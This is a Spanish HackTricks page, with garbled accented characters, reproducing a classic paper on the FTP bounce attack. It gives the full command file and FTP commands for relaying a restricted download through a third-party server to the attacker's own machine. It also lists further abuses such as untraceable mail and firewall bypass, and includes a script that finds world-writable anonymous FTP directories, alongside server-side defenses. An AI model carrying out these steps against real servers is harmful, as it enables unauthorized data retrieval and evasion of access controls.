<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Resumen

Si tienes acceso a un servidor FTP bounce, puedes hacer que solicite archivos de otro servidor FTP \(donde conoces algunas credenciales\) y descargar ese archivo a tu propio servidor.

## Requisitos

Credenciales v√°lidas de FTP en el servidor FTP Intermedio
Credenciales v√°lidas de FTP en el servidor FTP V√≠ctima
Ambos servidores aceptan el comando PORT \(ataque FTP bounce\)
Puedes escribir dentro de alg√∫n directorio del servidor FTP Intermedio
El servidor intermedio tendr√° m√°s acceso dentro del servidor FTP V√≠ctima que t√∫ por alguna raz√≥n \(esto es lo que vas a explotar\)

## Pasos

1. Con√©ctate a tu propio servidor FTP y haz que la conexi√≥n sea pasiva \(comando pasv\) para que escuche en un directorio donde el servicio de la v√≠ctima enviar√° el archivo
2. Crea el archivo que va a enviar el servidor FTP Intermedio al servidor V√≠ctima \(el exploit\). Este archivo ser√° un texto plano con los comandos necesarios para autenticarse contra el servidor V√≠ctima, cambiar el directorio y descargar un archivo a tu propio servidor.
3. Con√©ctate al servidor FTP Intermedio y sube el archivo anterior
4. Haz que el servidor FTP Intermedio establezca una conexi√≥n con el servidor v√≠ctima y env√≠e el archivo de exploit
5. Captura el archivo en tu propio servidor FTP
6. Elimina el archivo de exploit del servidor FTP Intermedio



Toda la informaci√≥n de este post fue extra√≠da de: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)

# El Ataque FTP Bounce

Este discute uno de los muchos posibles usos del "ataque de rebote del servidor FTP". El mecanismo utilizado es probablemente bien conocido, pero hasta la fecha el inter√©s en detallarlo o solucionarlo parece bajo o inexistente. Este ejemplo particular demuestra otra forma en la que la mayor√≠a de las "restricciones de exportaci√≥n" impuestas electr√≥nicamente son completamente in√∫tiles y triviales de eludir. Se elige en un esfuerzo por hacer que el lector se d√© cuenta de que hay algunos aspectos realmente mal concebidos del protocolo FTP est√°ndar.

Gracias tambi√©n a Alain Knaff en imag.fr por una breve pero entretenida discusi√≥n sobre algunos de estos temas hace un par de meses que me hizo pensar m√°s profundamente sobre ellos.

## El motivo

Eres un usuario en foreign.fr, con direcci√≥n IP F.F.F.F, y quieres recuperar el c√≥digo fuente criptogr√°fico de crypto.com en EE. UU. El servidor FTP en crypto.com est√° configurado para permitir tu conexi√≥n, pero denegar el acceso a las fuentes criptogr√°ficas porque tu direcci√≥n IP de origen es la de un sitio no estadounidense \[seg√∫n lo que su servidor FTP puede determinar del DNS, eso es\]. En cualquier caso, no puedes recuperar directamente lo que deseas del servidor de crypto.com.

Sin embargo, crypto.com permitir√° que ufred.edu descargue las fuentes criptogr√°ficas porque ufred.edu tambi√©n est√° en EE. UU. Resulta que sabes que /incoming en ufred.edu es un directorio de escritura mundial en el que cualquier usuario an√≥nimo puede depositar archivos y recuperarlos. La direcci√≥n IP de crypto.com es C.C.C.C.

## El ataque

Esto asume que tienes un servidor FTP que hace modo pasivo. Abre una conexi√≥n FTP a la direcci√≥n IP real de tu propia m√°quina \[no localhost\] e inicia sesi√≥n. Cambia a un directorio conveniente al que tengas acceso de escritura, y luego haz:
```text
pasv
stor foobar
```
Toma nota de la direcci√≥n y el puerto que se devuelven del comando PASV, F,F,F,F,X,X. Esta sesi√≥n de FTP ahora se colgar√°, as√≠ que minim√≠zala o cambia a otra ventana o algo para continuar con el resto de esto.

Construye un archivo que contenga comandos del servidor FTP. Llamemos a este archivo "`instrs`". Se ver√° as√≠:
```text
user ftp
pass -anonymous@
cwd /export-restricted-crypto
type i
port F,F,F,F,X,X
retr crypto.tar.Z
quit
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
...
```
```
Abre una conexi√≥n FTP a ufred.edu, inicia sesi√≥n de forma an√≥nima y cambia al directorio /incoming. Ahora escribe lo siguiente en esta sesi√≥n de FTP, lo que transfiere una copia de tu archivo "`instrs`" y luego le indica al servidor FTP de ufred.edu que se conecte al servidor FTP de crypto.com utilizando tu archivo como los comandos:
```
```text
put instrs
port C,C,C,C,0,21
retr instrs
```
`Crypto.tar.Z` ahora deber√≠a aparecer como "`foobar`" en tu m√°quina a trav√©s de tu primera conexi√≥n FTP. Si la conexi√≥n con ufred.edu no se cerr√≥ por s√≠ misma debido a un error com√∫n del servidor, limpia eliminando "`instrs`" y saliendo. De lo contrario, tendr√°s que reconectar para terminar.

## Discusi√≥n

Hay varias variantes de esto. Tu conexi√≥n de escucha PASV se puede abrir en cualquier m√°quina a la que tengas acceso de escritura de archivos: la tuya, otra conexi√≥n a ufred.edu o en alg√∫n lugar completamente no relacionado. De hecho, ni siquiera tiene que ser un servidor FTP: cualquier utilidad que escuche en un puerto TCP conocido y lea datos en bruto de √©l en un archivo servir√°. Una conexi√≥n de datos FTP en modo pasivo es simplemente una forma conveniente de hacer esto.

Los nulos adicionales al final del archivo de comandos son para llenar las ventanas TCP en ambos extremos de la conexi√≥n ufred -&gt; crypto y asegurar que la conexi√≥n de comandos permanezca abierta el tiempo suficiente para que se ejecute toda la sesi√≥n. De lo contrario, la mayor√≠a de los servidores FTP tienden a abortar todas las transferencias y el procesamiento de comandos cuando la conexi√≥n de control se cierra prematuramente. El tama√±o de los datos es suficiente para llenar tanto las ventanas de recepci√≥n como de transmisi√≥n, que en algunos sistemas operativos son bastante grandes \[del orden de 30K\]. Puedes reducir esto si conoces qu√© sistemas operativos est√°n en cada extremo y la suma de sus tama√±os de ventana TCP predeterminados. Se divide en l√≠neas de 250 caracteres para evitar desbordar los b√∫feres de comandos en el servidor objetivo, probablemente acad√©mico ya que ya le dijiste al servidor que se cerrara.

Si crypto.com proh√≠be \*cualquier\* conexi√≥n de cliente FTP desde ti en foreign.fr y necesitas ver qu√© archivos est√°n d√≥nde, siempre puedes poner "`list -aR`" en tu archivo de comandos y obtener un listado de directorios de todo el √°rbol a trav√©s de ufred.

Puede que tengas que recuperar tu archivo de comandos al servidor FTP del objetivo en modo ASCII en lugar de modo binario. Algunos servidores FTP pueden manejar nuevas l√≠neas en bruto, pero otros pueden necesitar l√≠neas de comandos terminadas por pares CRLF. Ten esto en cuenta tambi√©n al recuperar archivos a demonios que no sean servidores FTP.

## Otras posibilidades

A pesar de que tales conexiones de terceros son solo de un sentido, se pueden usar para todo tipo de cosas. M√©todos similares se pueden usar para publicar correos y noticias pr√°cticamente imposibles de rastrear, atacar servidores en varios sitios, llenar discos, intentar saltar firewalls y, en general, ser molesto y dif√≠cil de rastrear al mismo tiempo. Un poco de reflexi√≥n traer√° la realizaci√≥n de numerosas otras posibilidades aterradoras.

Las conexiones lanzadas de esta manera provienen del puerto de origen 20, que algunos sitios permiten a trav√©s de sus firewalls en un esfuerzo por lidiar con el problema de "datos de ftp". Para algunos prop√≥sitos, esto puede ser lo mejor despu√©s de los ataques con ruta de origen, y es probable que tenga √©xito donde el enrutamiento de origen falla contra los filtros de paquetes. Y todo esto es posible gracias a la forma en que se escribi√≥ la especificaci√≥n del protocolo FTP, permitiendo que las conexiones de control provengan de cualquier lugar y que las conexiones de datos vayan a cualquier lugar.

## Defensas

Siempre habr√° sitios en la red con servidores FTP antiguos y directorios escribibles que permitan este tipo de tr√°fico, por lo que decir "arreglar todos los servidores FTP" es la respuesta incorrecta. Pero puedes proteger el tuyo contra ser un punto de rebote de terceros y que otro sea usado en tu contra.

Lo primero obvio que hacer es permitir que un servidor FTP solo haga conexiones de datos al mismo host de donde se origin√≥ la conexi√≥n de control. Esto no previene el ataque anterior, por supuesto, ya que el oyente PASV podr√≠a estar igualmente en ufred.edu y as√≠ cumplir con ese requisito, pero s√≠ previene que \*tu\* sitio sea un punto de rebote potencial. Tambi√©n rompe el concepto de "FTP proxy", pero escondido en alg√∫n lugar de este p√°rrafo hay un viol√≠n muy peque√±o.

Lo siguiente obvio es prohibir conexiones de control FTP que provengan de puertos reservados, o al menos del puerto 20. Esto previene el escenario anterior tal como se ha planteado.

Ambas cosas, m√°s la habitual charla sobre bloquear paquetes con ruta de origen y otras v√≠as de suplantaci√≥n, son necesarias para prevenir hacks de este tipo. Y piensa si realmente necesitas un directorio "entrante" abierto.

Permitir solo conexiones de datos de cliente en modo pasivo es otra posibilidad, pero todav√≠a hay demasiados clientes FTP en uso que no son conscientes del modo pasivo.

## "Un consenso flexible y c√≥digo en funcionamiento"

Hay algunos trabajos existentes que abordan esto disponibles aqu√≠ en avian.org \[y han estado durante varios meses, debo agregar\] en el "[archivo de fixkits](ftp://ftp.avian.org:/src/fixkits/)". Se presentan varias modificaciones a wu-ftpd-2.4, que incluyen c√≥digo para prevenir y registrar intentos de usar comandos PORT falsos. Tambi√©n se incluyen correcciones de seguridad recientes de otros lugares, junto con soporte s/key y varias opciones de compilaci√≥n para reforzar la seguridad para aplicaciones espec√≠ficas.

Stan Barber en academ.com est√° trabajando en fusionar estas y varias otras correcciones en una verdadera actualizaci√≥n de wu-ftpd. Hay un par de otros esfuerzos divergentes en marcha. En ning√∫n lugar se afirma que alguno de estos trabajos est√© completo todav√≠a, pero es un comienzo hacia algo que he tenido en mente por un tiempo: un lanzamiento de wu-ftpd-2.5 a nivel de red, con contribuciones de toda la red. El servidor wu-ftpd se ha vuelto muy popular, pero necesita urgentemente otra actualizaci√≥n de seguridad. Ser√≠a bueno reunir todas las mejoras en un lugar coordinado, y parece que suceder√°. Todo esto todav√≠a no ayudar√° a las personas que insisten en ejecutar servidores suministrados por el proveedor, por supuesto.

La verificaci√≥n de la cordura del puerto de origen de la conexi√≥n del cliente no est√° implementada espec√≠ficamente en las correcciones del servidor FTP, sino en modificaciones al paquete tcp-wrappers de Wietse, ya que este problema es m√°s general. Se agrega una simple opci√≥n PORT que niega conexiones de rangos configurables de puertos de origen en la etapa de tcpd, antes de que se ejecute un demonio llamado.

Algunos de esto se se√±ala por [/src/fixkits/README](ftp://ftp.avian.org:/src/fixkits/README) en el √°rea de FTP an√≥nimo aqu√≠. Lee esta hoja de ruta antes de agarrar otras cosas.

## Notas

Agregar los nulos al final del archivo de comandos fue la clave para hacer que esto funcionara contra una variedad de demonios. Simplemente enviar los datos deseados generalmente fallar√≠a debido al cierre inmediato que se√±ala al demonio para salir.

Si WUSTL no ha renunciado por completo al proyecto wu-ftpd, est√°n manteniendo muy en silencio sobre trabajos futuros. Bryan O'Connor parece tener muchos otros proyectos que atender por ahora...

Este es un script trivial para encontrar directorios y archivos de propiedad de ftp y escribibles por todos en un servidor FTP an√≥nimo basado en Unix. Te sorprender√≠a cu√°ntos de esos puntos de rebote escribibles aparecen despu√©s de una breve ejecuci√≥n de algo como esto. Tendr√°s que verificar m√°s tarde que puedes tanto PUT como GET archivos de tales lugares; algunos servidores protegen los archivos subidos contra la lectura. Muchos no lo hacen, y luego se preguntan por qu√© est√°n entre los diez principales sitios de warez de esta semana...
```text
#!/bin/sh
ftp -n $1 << FOE
quote "user ftp"
quote "pass -nobody@"
prompt
cd /
dir "-aR" xxx.$$
bye
FOE
# Not smart enough to figure out ftp's numeric UID if no passwd file!
cat -v xxx.$$ | awk '
BEGIN { idir = "/" ; dirp = 0 }
/.:$/ { idir = $0 ; dirp = 1 ; }
/^[-d][-r](......w.|........  *[0-9]* ftp  *)/ {
if (dirp == 1) print idir
dirp = 0
print $0
} '
rm xxx.$$
```
Supongo que se podr√≠a llamar a esto un documento t√©cnico. Est√° disponible en avian.org en [/random/ftp-attack](ftp://ftp.avian.org:/random/ftp-attack) as√≠ como publicado en varios lugares relevantes. \_H\* 950712

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
